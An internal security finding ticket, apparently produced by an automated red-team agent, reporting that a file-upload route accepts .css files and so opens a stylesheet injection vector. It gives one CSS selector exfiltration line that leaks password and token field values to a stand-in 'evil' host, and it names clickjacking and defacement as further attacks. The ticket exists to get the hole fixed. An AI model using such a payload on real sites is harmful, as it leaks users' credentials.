---
title: 'R-02 (HIGH): .css extension bypass — stylesheet injection vector'
status: closed
origin: agent
author: agent
author_type: agent
created_at: '2026-05-03T02:58:10Z'
iteration: 1
visit: 1
source_ref: stages/security/artifacts/RED-TEAM-unit-01.md#finding-r-02
closed_by: 'fix-loop:FB-02:bolt-1'
bolt: 1
triaged_at: '2026-05-03T02:58:10Z'
resolution: inline_fix
replies: []
hat: feedback-assessor
iterations:
  - bolt: 1
    hat: security-engineer
    completed_at: '2026-05-03T08:30:36Z'
    result: advanced
  - bolt: 1
    hat: feedback-assessor
    completed_at: '2026-05-03T08:39:00Z'
    result: closed
---
## Summary

Same root cause as R-01: `.css` is not in `BLOCKED_EXTENSIONS` and `application/octet-stream` is on `ALLOWED_MIMES_*`. Attacker uploads `pwn.css` with arbitrary content; reviewer's tunnel later loads it via `<link rel="stylesheet" href="...">` (chained from any other vector that injects markup) → server returns `text/css; charset=utf-8` → stylesheet executes.

## Attack class

CSS-based attacks the reviewer is exposed to:
- **Selector exfiltration** — `input[value^="x"] { background: url(https://evil/?leak=x); }` cycles through every prefix to leak password/token field values char by char.
- **Clickjacking overlays** — full-page `position: fixed` overlay covering the SPA controls.
- **Defacement** — replaces SPA chrome with attacker content under reviewer's privileged origin.

## Reproduction

PoC test passes against the live HTTP route: `packages/haiku/test/red-team-unit-01-upload-bypass.test.mjs` — test `R-02: .css upload accepted — stylesheet injection vector`.

```bash
$ npx tsx packages/haiku/test/red-team-unit-01-upload-bypass.test.mjs
  PASS R-02: .css upload accepted — stylesheet injection vector
```

## Recommended fix

Same as R-01: add `.css` to `BLOCKED_EXTENSIONS`. Apply the inverted-MIME-map fix from R-01 in the same change.

## Acceptance

- `.css` rejected at upload with 415 `unsupported_media_type` regardless of MIME claim.
- R-02 PoC test inverted to assert rejection.
- Parameterised regression test added to `upload-routes.test.mjs`.
